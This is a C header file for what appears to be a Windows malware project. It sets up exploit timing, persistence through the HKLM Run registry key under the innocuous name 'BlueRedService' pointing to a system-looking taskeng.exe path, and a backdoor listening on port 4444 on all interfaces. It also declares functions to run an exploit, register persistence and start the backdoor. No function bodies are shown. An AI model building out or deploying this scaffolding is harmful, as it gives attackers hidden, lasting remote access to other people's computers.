#pragma once

#define WINVER 0x0A00
#define _WIN32_WINNT 0x0A00

// Include Windows headers FIRST
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>
#include <conio.h>
#include <ws2tcpip.h>

// Include common types and helper functions
#include "../include/common_types.h"

// Exploit Timing
#define EXPLOIT_DELAY_MS 150

// Persistence Configuration
#define PERSIST_PATH L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PERSIST_VAL_NAME L"BlueRedService"
#define PERSIST_VAL_DATA L"C:\\Windows\\System32\\taskeng.exe"

// Backdoor Configuration
#define BACKDOOR_PORT 4444
#define BACKDOOR_HOST "0.0.0.0"
#define SOCKET_BUFFER_SIZE 4096
#define SOCKET_BACKLOG 10

// Function Prototypes
extern void InitializeWinsock(void);
extern BOOL IsAdmin(void);

BOOL ExecuteExploitLogic(void);
BOOL RegisterPersistence(void);
BOOL StartBackdoor(void);
